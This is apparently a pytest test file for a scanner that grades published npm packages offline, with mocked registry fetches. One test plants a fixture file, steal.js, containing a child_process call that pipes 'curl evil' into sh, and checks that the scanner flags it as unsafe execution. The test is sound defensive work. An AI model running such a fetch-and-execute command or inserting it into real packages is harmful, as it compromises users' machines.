"""Native npm/PyPI package scanning by coordinate (src.scanner.scan.scan_package).

Grades a PUBLISHED package directly — no GitHub repo. Fully offline: the registry
fetch is mocked so no network is hit; the real scan_artifact_files + scoring run.
"""
from __future__ import annotations

import pytest

from src.config import settings


def _fetched(**over):
    from src.scanner.artifact_fetch import ArtifactFetchResult, ArtifactFile

    files = over.pop("files", None)
    if files is None:
        files = {
            "index.js": ArtifactFile(
                path="index.js", size=22, sha256="a" * 64,
                text="module.exports = function () { return 1 }\n",
            ),
            "README.md": ArtifactFile(
                path="README.md", size=10, sha256="c" * 64, text="# demo\n",
            ),
        }
    base = dict(
        ecosystem="npm", name="demo", version="1.0.0", kind="tarball", ok=True,
        digest="sha256:" + "b" * 64,
        download_url="https://registry.npmjs.org/demo/-/demo-1.0.0.tgz",
        files=files, unpacked_size=32, file_count=len(files),
        packaged_manifest={"name": "demo", "repository": "github.com/acme/demo"},
    )
    base.update(over)
    return ArtifactFetchResult(**base)


@pytest.mark.asyncio
async def test_scan_package_npm_clean(monkeypatch):
    from src.scanner import artifact_fetch as af
    monkeypatch.setattr(settings, "scanner_scan_artifact", True)
    monkeypatch.setattr(settings, "scanner_verify_provenance", False)

    async def fake_npm(name, version=None, *, client=None):
        return _fetched(name=name)
    monkeypatch.setattr(af, "fetch_npm_artifact", fake_npm)

    from src.scanner.scan import scan_package
    res = await scan_package("npm", "demo")

    assert res.error is None
    assert res.repo == "npm:demo"
    assert res.coverage["surface"] == "npm"
    assert res.coverage["scan_depth"] == "artifact"
    assert res.coverage["artifact_digest"] == "sha256:" + "b" * 64
    assert res.primary_language.startswith("JavaScript")
    assert res.has_readme is True
    assert res.trust_score > 0
    assert "eligible" in res.certified
    # A clean artifact with provenance OFF can't be certified (no verified provenance).
    assert res.certified["checks"]["artifact_scanned"] is True
    assert res.certified["checks"]["provenance_verified"] is False


@pytest.mark.asyncio
async def test_scan_package_flags_malicious_code(monkeypatch):
    from src.scanner import artifact_fetch as af
    from src.scanner.artifact_fetch import ArtifactFile
    monkeypatch.setattr(settings, "scanner_scan_artifact", True)
    monkeypatch.setattr(settings, "scanner_verify_provenance", False)

    evil = {
        "steal.js": ArtifactFile(
            path="steal.js", size=60, sha256="d" * 64,
            text="const cp = require('child_process'); cp.exec('curl evil|sh')\n",
        ),
    }

    async def fake_npm(name, version=None, *, client=None):
        return _fetched(name=name, files=evil, file_count=1)
    monkeypatch.setattr(af, "fetch_npm_artifact", fake_npm)

    from src.scanner.scan import scan_package
    res = await scan_package("npm", "evil-pkg")
    # The real child_process.exec must be caught on the artifact tree.
    assert any(f.category == "unsafe_exec" for f in res.findings)
    assert res.trust_score < 90


@pytest.mark.asyncio
async def test_scan_package_unsupported_surface():
    from src.scanner.scan import scan_package
    res = await scan_package("rubygems", "rails")
    assert res.error and "unsupported" in res.error.lower()


@pytest.mark.asyncio
async def test_scan_package_fetch_error_is_failopen(monkeypatch):
    from src.scanner import artifact_fetch as af
    from src.scanner.artifact_fetch import ArtifactFetchError
    monkeypatch.setattr(settings, "scanner_scan_artifact", True)

    async def boom(name, version=None, *, client=None):
        raise ArtifactFetchError("npm version not found: demo@9.9.9")
    monkeypatch.setattr(af, "fetch_npm_artifact", boom)

    from src.scanner.scan import scan_package
    res = await scan_package("npm", "demo", "9.9.9")
    assert res.error and "not found" in res.error.lower()
    assert res.trust_score == 0  # never raised
